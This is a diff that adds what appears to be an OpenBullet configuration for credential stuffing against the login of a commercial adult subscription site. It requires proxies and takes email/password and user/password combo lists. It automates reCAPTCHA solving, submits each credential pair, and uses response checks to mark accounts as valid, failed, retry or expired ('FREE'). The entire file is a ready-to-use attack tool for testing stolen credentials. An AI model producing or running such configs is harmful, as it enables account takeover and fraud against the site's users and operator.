@@ -1,0 +1,89 @@
+[SETTINGS]
+{
+  "Name": "Brazzers",
+  "SuggestedBots": 15,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-31T22:06:52.2914648+04:30",
+  "AdditionalInfo": "",
+  "Author": "Attaker121_bot",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "https://ma.brazzers.com/access/login/" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+
+RECAPTCHA "https://ma.brazzers.com/access/login/" "6LeY4gsUAAAAANITYkv2gPI8eEu8am3TCOr4B6j7" -> VAR "RECAP" 
+
+#LOGIN REQUEST POST "https://ma.brazzers.com/access/submit/" 
+  CONTENT "username=<USER>&password=<PASS>&g-recaptcha-response=<RECAP>&rememberme=on" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://ma.brazzers.com/access/login/" 
+  HEADER "origin: https://ma.brazzers.com" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY ">Login Error</" 
+  KEYCHAIN Success OR 
+    KEY "Fallback Procedure - Brazzers" 
+  KEYCHAIN Retry OR 
+    KEY "Please fill out the reCAPTCHA" 
+
+#PARSE_RESPONSE PARSE "<SOURCE>" CSS "[name=response]" "value" -> VAR "RESPONSE" 
+
+#FALLBACK REQUEST POST "https://ma.brazzers.com/access/success/?postFallback=1" 
+  CONTENT "response=<RESPONSE>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: http://probiller.com" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<h1>Renew</h1>" 
+
